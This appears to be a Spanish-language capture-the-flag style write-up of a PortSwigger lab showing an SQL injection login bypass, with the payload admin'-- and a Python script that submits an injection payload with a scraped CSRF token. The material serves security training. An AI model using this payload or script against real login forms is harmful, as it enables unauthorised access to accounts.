---
title: "02 Write-up: SQL injection vulnerability allowing login bypass"
collection: publications
category: portswigger
permalink: publications/SQLi/02_SQL_injection_vulnerability_allowing_login_bypass
excerpt: 'Este laboratorio contiene una vulnerabilidad de inyección SQL en la función de inicio de sesión. Para resolver el laboratorio, realizamos un ataque de inyección SQL que elude la autenticación y nos permite iniciar sesión en la aplicación como usuario administrador.'
date: 2024-12-01
#venue: 'Journal 1'
#slidesurl: 'http://academicpages.github.io/files/slides1.pdf'
#paperurl: 'http://academicpages.github.io/files/paper1.pdf'
citation: 'SQL injection vulnerability allowing login bypass'
---

![logo]({{site.url}}/images/SQLi/sqli-2/logo.png)

Lab-Link: <https://portswigger.net/web-security/sql-injection/lab-login-bypass>  
Dificultad: APPRENTICE  

## Descripción del laboratorio

![Descripción]({{site.url}}/images/SQLi/sqli-2/descripcion.png)

## Analisis del entorno
Insertamos la comilla simple `'` en el campo de usuario y en el campo de password `password`. 

![Pruebas]({{site.url}}/images/SQLi/sqli-2/Prueba_1.png)

La consulta utilizada en el laboratorio tendrá un aspecto similar a:

```sql
SELECT * FROM users WHERE username = ''' AND password = 'password'
```

El backend trata de realizar la consulta previamente resalizada y nos arroja un error ya que es un error de sintaxis.

![Error]({{site.url}}/images/SQLi/sqli-2/error.png)

Necesitamos acomodar esta consulta para que pueda funcionar. Vamos a realizar la consulta para un usuario y comentamos la demas sentencia, quedaria algo asi:

```sql
SELECT * FROM users WHERE username = 'admin' -- ' AND password = 'password'
```

![Login_1]({{site.url}}/images/SQLi/sqli-2/login_1.png)

Si el usuario `admin` no existe nos arrojara un error y se muestra en pantalla, toca ingresar un usuario valido.

![Error_2]({{site.url}}/images/SQLi/sqli-2/error 2.png)

Probamos con un usuario valido y vemos que nos hace la redirección y solventa el laboratorio

![Login_2]({{site.url}}/images/SQLi/sqli-2/login_2.png)

Lo que envia Burpsuite es en url encode:

![Envio de dato]({{site.url}}/images/SQLi/sqli-2/Respuesta desde Burpsuite.png)

Aprobado el laboratorio

![Aprobado]({{site.url}}/images/SQLi/sqli-2/aprobado.png)

# Codigo Python
```python
import requests
import sys
import urllib3
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def get_csrf_token(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input")['value']
    print(csrf)
    return csrf

def exploit_sqli(s, url, payload):
    csrf = get_csrf_token(s, url)
    data = {"csrf":csrf,
            "username": payload,
            "password": "randomtext"
            }
    r = s.post(url, data=data, verify=False, proxies=proxies)
    res = r.text
    if "Log out" in res:
        return True
    else:
        return False


if __name__ == '__main__':
    try:
        url = sys.argv[1].strip()
        sqli_payload =  sys.argv[2].strip()
    except IndexError:
        print("[-] Usage: %s <url> <payload>" % sys.argv[0])
        print('[-] Example: %s www.example.com "1=1"' % sys.argv[0])

    s = requests.Session()

    if exploit_sqli(s, url, sqli_payload):
        print('[+] SQL injection succesfull! We have logged in as the administrator user.')
    else:
        print('[-] SQL injection unsuccesful.')
```